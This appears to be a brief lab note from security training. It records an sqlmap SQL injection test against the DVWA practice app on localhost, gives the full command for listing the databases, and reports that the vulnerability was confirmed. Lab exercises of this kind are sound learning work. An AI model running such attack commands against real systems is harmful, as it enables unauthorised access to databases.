**SQL Injection – Automated Testing**

Tool: SQLmap

Command:
sqlmap "http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1" --cookie "security=low" --dbs

Result:
- Databases extracted successfully
- Vulnerability confirmed
